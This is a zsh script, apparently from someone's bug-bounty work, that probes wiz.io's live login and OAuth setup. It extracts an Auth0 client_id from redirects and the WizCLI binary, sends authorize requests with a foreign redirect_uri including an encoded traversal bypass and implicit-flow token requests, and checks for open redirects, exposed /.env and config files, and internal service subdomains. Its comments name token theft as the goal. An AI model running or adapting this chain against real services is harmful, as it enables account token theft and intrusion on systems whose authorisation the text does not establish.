#!/usr/bin/env zsh
# Phase 4 — Auth0 client_id extraction + redirect_uri bypass probe
#
# Objective: Extract the real Auth0 client_id used by app.wiz.io / community.wiz.io
# then test whether win-test.wiz.io is an accepted redirect_uri (Chain 2 gate).
#
# ALL active probing runs on Pi. Cloud env = analysis only.
# Usage: zsh ~/bug-bounty-hunting-/scripts/phase4-auth0-clientid-wiz.sh

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin

RESULTS=~/bug-bounty-hunting-/results/wiz.io/04-auth0
mkdir -p "$RESULTS"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$RESULTS/auth0-hunt.log"; }
sep() { echo "================================================================" | tee -a "$RESULTS/auth0-hunt.log"; }

log "=== Phase 4 — Auth0 client_id extraction ==="
sep

# ----------------------------------------------------------------
# 1. community.wiz.io → follow login redirect to Auth0
#    Discourse SSO typically redirects /auth/<provider> straight to
#    the Auth0 authorize endpoint, leaking client_id in the Location header
# ----------------------------------------------------------------
log "1. community.wiz.io login redirect chain"

{
  echo "=== community.wiz.io /auth paths (follow redirects) ==="
  for ep in \
    "/auth/auth0" \
    "/auth/oidc" \
    "/auth/google_oauth2" \
    "/login" \
    "/session/sso" \
    "/session/sso_provider" \
    "/auth/oauth2"; do
    echo "--- GET ${ep} ---"
    curl -sI --max-redirs 5 --connect-timeout 10 \
      "https://community.wiz.io${ep}" 2>/dev/null | grep -iE "^HTTP|^location:|^set-cookie:"
    echo ""
  done

  echo ""
  echo "=== community.wiz.io/.well-known/openid-configuration ==="
  curl -sk --connect-timeout 10 "https://community.wiz.io/.well-known/openid-configuration" 2>/dev/null

  echo ""
  echo "=== community.wiz.io homepage link extraction ==="
  curl -sk "https://community.wiz.io/" 2>/dev/null | grep -oEi '(client_id|auth0|authorize)[^"]*"[^"]{10,80}' | head -10
} | tee "$RESULTS/community-auth-redirect.txt"
log "community.wiz.io output → $RESULTS/community-auth-redirect.txt"
sep

# ----------------------------------------------------------------
# 2. app.wiz.io — server-side login redirect paths
#    NextAuth.js or similar: /api/auth/signin, /api/auth/providers, etc.
# ----------------------------------------------------------------
log "2. app.wiz.io server-side auth endpoints"

{
  echo "=== Auth endpoint redirect chains ==="
  for ep in \
    "/api/auth/providers" \
    "/api/auth/signin" \
    "/api/auth/signin/auth0" \
    "/api/auth/login" \
    "/api/auth/callback" \
    "/auth/login" \
    "/login" \
    "/api/login" \
    "/api/config" \
    "/api/tenant" \
    "/api/version" \
    "/_next/data/build-id/login.json"; do
    echo "--- GET ${ep} ---"
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 "https://app.wiz.io${ep}" 2>/dev/null)
    loc=$(curl -sI --max-redirs 0 --connect-timeout 8 "https://app.wiz.io${ep}" 2>/dev/null \
      | grep -i "^location:" | head -1)
    echo "  Status: ${code}  Location: ${loc}"
  done

  echo ""
  echo "=== Follow /login with browser-like UA ==="
  curl -sIL --max-redirs 8 --connect-timeout 12 \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
    "https://app.wiz.io/login" 2>/dev/null \
    | grep -iE "^HTTP|^location:|^set-cookie:|client_id"

  echo ""
  echo "=== app.wiz.io/api/auth/providers (NextAuth) ==="
  curl -sk --connect-timeout 10 "https://app.wiz.io/api/auth/providers" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -40
} | tee "$RESULTS/app-wiz-auth-probe.txt"
log "app.wiz.io auth probe → $RESULTS/app-wiz-auth-probe.txt"
sep

# ----------------------------------------------------------------
# 3. Other portals that SSO via Auth0
#    Each one's login redirect will expose client_id in Location header
# ----------------------------------------------------------------
log "3. Alternate portal login redirect chains"

{
  for base in \
    "https://app.demo.wiz.io" \
    "https://app.e2e.wiz.io" \
    "https://app.test.wiz.io" \
    "https://app.stage.wiz.io" \
    "https://partners.wiz.io" \
    "https://docs.wiz.io"; do
    echo "=== ${base}/login ==="
    curl -sIL --max-redirs 5 --connect-timeout 10 "${base}/login" 2>/dev/null \
      | grep -iE "^HTTP|^location:|client_id"
    echo ""
  done
} | tee "$RESULTS/portal-login-redirects.txt"
log "Portal login redirect chains → $RESULTS/portal-login-redirects.txt"
sep

# ----------------------------------------------------------------
# 4. WizCLI binary — deeper client_id extraction
#    The binary fetches client_id from GetTenantResponse gRPC.
#    The audience value IS hardcoded and tied to the Auth0 config.
# ----------------------------------------------------------------
log "4. WizCLI binary — audience + client_id string search"

WIZCLI=/tmp/wizcli
if [ ! -f "$WIZCLI" ]; then
  log "Downloading wizcli..."
  curl -s "https://downloads.wiz.io/v1/wizcli/latest/wizcli-linux-arm64" -o "$WIZCLI"
  chmod +x "$WIZCLI"
fi

{
  echo "=== audience values ==="
  strings "$WIZCLI" | grep -Ei "audience" | sort -u | head -20

  echo ""
  echo "=== Auth0 domain references ==="
  strings "$WIZCLI" | grep -Ei "auth0\.(com|[a-z0-9-]+\.wiz\.io)" | sort -u | head -30

  echo ""
  echo "=== OAuth2 / OIDC config keys ==="
  strings "$WIZCLI" | grep -Ei "(client[_-]id|client[_-]secret|auth[_-]domain|tenant[_-]id|tenant_url|app_url|api_url)" | sort -u | head -30

  echo ""
  echo "=== Potential client_id format: 32-char alphanumeric (Auth0 style) ==="
  strings "$WIZCLI" | grep -Eo '^[a-zA-Z0-9]{26,}$' | awk 'length($0)>=26 && length($0)<=36' | sort -u | head -40

  echo ""
  echo "=== tenant_url / API URLs ==="
  strings "$WIZCLI" | grep -Ei "https?://[a-z0-9._-]+(\.wiz\.io|\.auth0\.com)" | sort -u | head -40

  echo ""
  echo "=== grpc target URLs ==="
  strings "$WIZCLI" | grep -Ei "(grpc\.|:443|:8443|:9090)" | grep -v "golang\|github\|google" | sort -u | head -20

  echo ""
  echo "=== WIZCLI_DEBUG / env var help text ==="
  strings "$WIZCLI" | grep -Ei "(WIZCLI_|WIZ_|debug|log.level|verbose)" | grep -v "golang\|test\|assert" | sort -u | head -30
} | tee "$RESULTS/wizcli-auth-strings.txt"
log "WizCLI auth strings → $RESULTS/wizcli-auth-strings.txt"

# Try wizcli with debug env vars
log "4b. wizcli debug env var attempt"
{
  echo "=== WIZCLI_LOG_LEVEL=debug ==="
  timeout 8 env WIZCLI_LOG_LEVEL=debug WIZ_LOG_LEVEL=debug \
    "$WIZCLI" auth --use-device-code 2>&1 | head -60 || true

  echo ""
  echo "=== GODEBUG=http2debug=2 (Go HTTP/2 frame dump) ==="
  timeout 8 env GODEBUG=http2debug=2 \
    "$WIZCLI" auth --use-device-code 2>&1 | grep -E "(client_id|audience|auth0|device|POST|GET)" | head -30 || true
} | tee "$RESULTS/wizcli-debug-output.txt"
log "WizCLI debug output → $RESULTS/wizcli-debug-output.txt"
sep

# ----------------------------------------------------------------
# 5. strace approach — intercept write() before TLS (only works
#    if the binary writes plaintext before TLS layer)
#    Go TLS is in userspace so this only works for HTTP, not HTTPS.
#    But we check for any leaked credential patterns.
# ----------------------------------------------------------------
log "5. strace plaintext capture attempt (low probability but free)"

{
  echo "=== strace write syscalls (look for client_id) ==="
  timeout 12 strace -e trace=write,read -s 2000 \
    "$WIZCLI" auth --use-device-code 2>&1 \
    | grep -Eo '"client_id":"[^"]{10,50}"' | head -5 || true

  echo "(strace of TLS traffic shows encrypted bytes; plaintext only if HTTP fallback used)"
} | tee "$RESULTS/strace-attempt.txt"
log "strace attempt → $RESULTS/strace-attempt.txt"
sep

# ----------------------------------------------------------------
# 6. Internal service DNS check
#    From binary analysis: connector-dal, tunnel-server, wiz-git-proxy,
#    auth0-fetcher, agent-gateway, ops-accessbot, etc.
#    Check if any resolve externally (mis-scoped DNS).
# ----------------------------------------------------------------
log "6. Internal microservice DNS check"

{
  echo "=== Checking internal service names as wiz.io subdomains ==="
  for svc in \
    wiz-git-proxy \
    git-proxy \
    tunnel-server \
    connector-dal \
    techstack-dal \
    benchmark-dal \
    cspm-ingestor \
    auth0-fetcher \
    agent-gateway \
    ops-accessbot \
    ops-oncallbot \
    netreputation \
    ops-freezebot \
    ops-deploybot \
    slack-app-dal \
    inventory-dal \
    azure-fetcher \
    sast-ingestor \
    modelscan-dal \
    dast-ingestor \
    saas-ingestor \
    risk-operator \
    ops-exportbot \
    oss-datastore \
    forensic-cron \
    grpc \
    grpc-api \
    internal-api \
    internal \
    vault \
    consul \
    k8s \
    kubernetes; do
    ip=$(dig A "${svc}.wiz.io" +short 2>/dev/null | head -1)
    if [ -n "$ip" ]; then
      echo "LIVE: ${svc}.wiz.io → $ip"
      # Quick banner grab
      banner=$(curl -sk --connect-timeout 8 --max-time 10 "https://${svc}.wiz.io/" 2>/dev/null | head -c 200)
      echo "  BANNER: $banner"
    else
      echo "dead: ${svc}.wiz.io"
    fi
  done
} | tee "$RESULTS/internal-dns-check.txt"
log "Internal DNS check → $RESULTS/internal-dns-check.txt"
sep

# ----------------------------------------------------------------
# 7. OAuth redirect_uri bypass — run only if client_id found
# ----------------------------------------------------------------
log "7. OAuth redirect_uri bypass probe"

# Extract client_id from earlier steps
CLIENT_ID=$(grep -oE 'client_id[=:]["\x27]?([a-zA-Z0-9_-]{20,40})' \
  "$RESULTS/community-auth-redirect.txt" \
  "$RESULTS/app-wiz-auth-probe.txt" \
  "$RESULTS/portal-login-redirects.txt" \
  "$RESULTS/wizcli-auth-strings.txt" 2>/dev/null \
  | grep -oE '[a-zA-Z0-9_-]{20,40}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

if [ -z "$CLIENT_ID" ]; then
  log "! client_id not found in automated scan. Trying manual extraction from debug output..."
  CLIENT_ID=$(grep -oE '[a-zA-Z0-9]{26,36}' "$RESULTS/wizcli-debug-output.txt" 2>/dev/null \
    | grep -v "false\|true\|error\|warn\|info\|debug" | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
fi

{
  if [ -n "$CLIENT_ID" ]; then
    log "!!! client_id FOUND: $CLIENT_ID — running redirect_uri bypass tests"
    echo "CLIENT_ID: $CLIENT_ID"
    echo ""

    for auth0_tenant in "auth0.demo.wiz.io" "auth0.e2e.wiz.io"; do
      echo "=== Testing ${auth0_tenant} with redirect_uri=win-test.wiz.io ==="

      # Test 1: direct win-test.wiz.io as redirect_uri
      RESP=$(curl -sI --max-redirs 0 --connect-timeout 10 \
        "https://${auth0_tenant}/authorize?\
response_type=code&\
client_id=${CLIENT_ID}&\
redirect_uri=https://win-test.wiz.io/callback&\
scope=openid+profile+email&\
state=redir_test_$(date +%s)" 2>/dev/null)
      echo "Direct redirect_uri=win-test: $(echo "$RESP" | grep -i "^HTTP\|^location:")"

      # Test 2: URL-encoded bypass variations
      RESP2=$(curl -sI --max-redirs 0 --connect-timeout 10 \
        "https://${auth0_tenant}/authorize?\
response_type=code&\
client_id=${CLIENT_ID}&\
redirect_uri=https://win-test.wiz.io%2F%2E%2E%2Fcallback&\
scope=openid&\
state=redir_test2" 2>/dev/null)
      echo "URL-encoded bypass: $(echo "$RESP2" | grep -i "^HTTP\|^location:")"

      # Test 3: try with implicit flow (id_token in fragment — highest value if allowed)
      RESP3=$(curl -sI --max-redirs 0 --connect-timeout 10 \
        "https://${auth0_tenant}/authorize?\
response_type=token+id_token&\
client_id=${CLIENT_ID}&\
redirect_uri=https://win-test.wiz.io/callback&\
scope=openid+profile+email&\
nonce=testnonce123&\
state=implicit_test" 2>/dev/null)
      echo "Implicit flow test: $(echo "$RESP3" | grep -i "^HTTP\|^location:")"

      echo ""
    done

    # Check if response includes error about redirect_uri specifically
    # "redirect_uri_mismatch" = client_id valid, redirect_uri not in allowlist
    # "unauthorized_client" = client_id valid, grant type not allowed
    # "access_denied" or redirect back = potential bypass
  else
    log "! client_id NOT found — skipping redirect_uri probe"
    echo "client_id not found in any output. Manual extraction required."
    echo "Run: curl -sIL --max-redirs 8 'https://community.wiz.io/auth/auth0' 2>&1 | grep -i 'location:'"
    echo "Or: curl -sIL --max-redirs 8 'https://app.wiz.io/login' 2>&1 | grep -i 'client_id'"
  fi
} | tee "$RESULTS/redirect-uri-bypass.txt"
log "Redirect URI bypass results → $RESULTS/redirect-uri-bypass.txt"
sep

# ----------------------------------------------------------------
# 8. Implicit grant abuse check
#    auth0.demo.wiz.io has 'implicit' grant enabled.
#    If we can get a token via implicit + open redirect on wiz.io → token theft.
# ----------------------------------------------------------------
log "8. Implicit grant + open redirect chain check"

{
  echo "=== Does app.wiz.io have any open redirect endpoints? ==="
  # Common open redirect patterns in portals
  for ep in \
    "/redirect?url=https://example.com" \
    "/r?url=https://example.com" \
    "/out?url=https://example.com" \
    "/go?to=https://example.com" \
    "/api/redirect?to=https://example.com" \
    "/callback?redirectUri=https://example.com"; do
    code=$(curl -so /dev/null -w "%{http_code}" --max-redirs 0 --connect-timeout 8 \
      "https://app.wiz.io${ep}" 2>/dev/null)
    loc=$(curl -sI --max-redirs 0 --connect-timeout 8 \
      "https://app.wiz.io${ep}" 2>/dev/null | grep -i "^location:" | head -1)
    [ "$code" = "301" ] || [ "$code" = "302" ] || [ "$code" = "303" ] && \
      echo "REDIRECT: ${code} ${ep} → ${loc}"
  done

  echo ""
  echo "=== community.wiz.io open redirect check ==="
  for ep in \
    "/redirect?url=https://example.com" \
    "/session/sso?return_path=https://example.com" \
    "/login?redirect_to=https://example.com"; do
    code=$(curl -so /dev/null -w "%{http_code}" --max-redirs 0 --connect-timeout 8 \
      "https://community.wiz.io${ep}" 2>/dev/null)
    loc=$(curl -sI --max-redirs 0 --connect-timeout 8 \
      "https://community.wiz.io${ep}" 2>/dev/null | grep -i "^location:" | head -1)
    [ "$code" = "301" ] || [ "$code" = "302" ] || [ "$code" = "303" ] && \
      echo "REDIRECT: ${code} ${ep} → ${loc}"
  done
} | tee "$RESULTS/open-redirect-check.txt"
log "Open redirect check → $RESULTS/open-redirect-check.txt"
sep

# ----------------------------------------------------------------
# 9. API key + secret scan — app.wiz.io + community JS bundles
# ----------------------------------------------------------------
log "9. JS bundle scan for auth config"

{
  echo "=== Next.js chunk manifest ==="
  curl -sk "https://app.wiz.io/_next/static/chunks/pages/_app.js" 2>/dev/null | head -c 500

  echo ""
  echo "=== app.wiz.io main manifest ==="
  MANIFEST=$(curl -sk "https://app.wiz.io/" 2>/dev/null | grep -oE '"/_next/static/[^"]{5,80}"' | head -5)
  echo "Manifest refs: $MANIFEST"

  # Common next.js build manifest
  for buildid in \
    "$(curl -sk 'https://app.wiz.io/' 2>/dev/null | grep -oE '"buildId":"[^"]+"' | grep -oE '[a-zA-Z0-9_-]{8,30}' | head -1)"; do
    [ -n "$buildid" ] && echo "BuildID: $buildid"
    [ -n "$buildid" ] && curl -sk "https://app.wiz.io/_next/data/${buildid}/login.json" 2>/dev/null | head -c 500
  done

  echo ""
  echo "=== app.wiz.io runtime config endpoint ==="
  for ep in \
    "/api/config.json" \
    "/config.json" \
    "/__/firebase/init.json" \
    "/api/public/config" \
    "/api/env" \
    "/.env"; do
    body=$(curl -sk --connect-timeout 8 "https://app.wiz.io${ep}" 2>/dev/null | head -c 300)
    [ -n "$body" ] && ! echo "$body" | grep -qi "<!doctype\|<html\|Not Found" && \
      echo "=== ${ep} ===" && echo "$body"
  done
} | tee "$RESULTS/js-config-probe.txt"
log "JS config probe → $RESULTS/js-config-probe.txt"
sep

log "=== Phase 4 COMPLETE ==="
log "Key file: $RESULTS/redirect-uri-bypass.txt"
log "Key file: $RESULTS/community-auth-redirect.txt"
log "Check for client_id:"
grep -rh "client_id" "$RESULTS/" 2>/dev/null | grep -oE '[a-zA-Z0-9_-]{20,40}' | sort | uniq -c | sort -rn | head -10
log "Results in: $RESULTS/"
ls -la "$RESULTS/"
